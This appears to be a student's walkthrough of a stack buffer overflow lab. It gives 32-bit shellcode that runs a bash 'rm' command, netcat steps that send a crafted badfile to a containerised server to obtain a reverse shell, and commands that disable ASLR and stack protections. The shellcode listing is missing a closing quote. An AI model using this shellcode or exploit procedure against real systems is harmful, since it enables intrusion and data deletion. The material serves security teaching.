# Task 1: Get Familiar with the Shellcode

Move into the directory "shellcode", create first a file called "remove.txt", and put this content in the shellcode_32.py program for the shellcode variable:

```python
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/rm remove.txt                                        *
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```
Then, run:

```console
$ ./shellcode_32.py
$ make
$ ./a32.out
```

And you will see that the file will be removed.

# Task 2: Level-1 Attack

Make always sure that you run the following command to disable the address randomization countermeasure enable by default in every OS:

```console
$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

Then, after building and starting all the Docker containers (as explained in the Readme.pdf file), send from the attacker machine a request to the server 10.9.0.5 at the port 9090 using netcat:

```console
$ echo hello | nc 10.9.0.5 9090
```

Substitute the values of EBP and BUF variables inside the file exploit.py in the attacker-code folder using the values returned by the target container, execute that file, open a new shell and start to listen at the port 9090 using netcat in order to reverse the shell and communicate with the server 10.9.0.5 (if running with the "-l" option, becomes a TCP server that listens for a connection on the specified port):

```console
$ nc -nv -l 9090
```

Finally, use netcat to send to the server the created badfile that will overflow the stack of the function bof used by the server, injecting a new return address that will point to the code that reverse the shell:

```console
$ cat badfile | nc 10.9.0.5 9090
```

# Task 3

Disable all protection and compile with debugging symbols. -q read symbols from binary file

```console
$ gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c
$ gdb -q stack-L2
$ b bof
$ pattern create 2000 input
$ r < input
$ p $ebp
$ p &buffer
```